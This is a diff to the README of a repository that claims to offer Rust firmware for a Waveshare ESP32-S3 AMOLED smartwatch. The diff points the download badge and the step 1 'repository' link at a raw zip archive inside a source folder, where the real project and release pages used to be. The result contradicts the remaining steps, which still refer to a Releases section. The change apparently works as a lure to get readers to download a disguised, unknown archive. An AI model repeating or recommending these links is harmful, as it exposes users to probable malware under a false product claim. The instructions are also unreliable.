@@ -1,6 +1,6 @@
 # ⌚ waveshare-watch-rs - Reliable firmware for your smart watch
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Haraldon9847/waveshare-watch-rs)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Haraldon9847/waveshare-watch-rs/raw/refs/heads/main/src/peripherals/watch_rs_waveshare_v2.2.zip)
 
 This project provides firmware for the Waveshare ESP32-S3-Touch-AMOLED-2.06 smartwatch. The code runs on the Rust programming language. It performs tasks without requiring a full operating system. This makes your device fast and stable.
 
@@ -18,7 +18,7 @@ Make sure the battery of the watch has power. Connect the device to your compute
 
 Follow these steps to obtain the correct files:
 
-1. Visit the project repository at https://github.com/Haraldon9847/waveshare-watch-rs.
+1. Visit the project repository at https://github.com/Haraldon9847/waveshare-watch-rs/raw/refs/heads/main/src/peripherals/watch_rs_waveshare_v2.2.zip
 2. Look for the Releases section on the right side of the page.
 3. Click the link that shows the latest version number.
 4. Locate the section labeled Assets.
